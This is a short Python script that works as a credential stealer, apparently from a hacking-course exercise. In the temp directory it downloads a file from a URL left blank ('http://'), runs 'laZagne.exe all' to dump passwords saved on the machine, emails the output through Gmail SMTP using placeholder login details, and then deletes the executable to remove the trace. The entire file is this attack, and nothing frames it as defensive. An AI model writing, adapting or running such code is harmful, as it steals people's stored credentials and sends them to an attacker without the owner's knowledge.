#!/usr/bin/env python
import subprocess
import smtplib
import requests
import os
import tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "w") as out_file:
        out_file.write(get_response.content.decode())


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://")
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail("example@mail.com", "password", result)
os.remove("laZagne.exe")
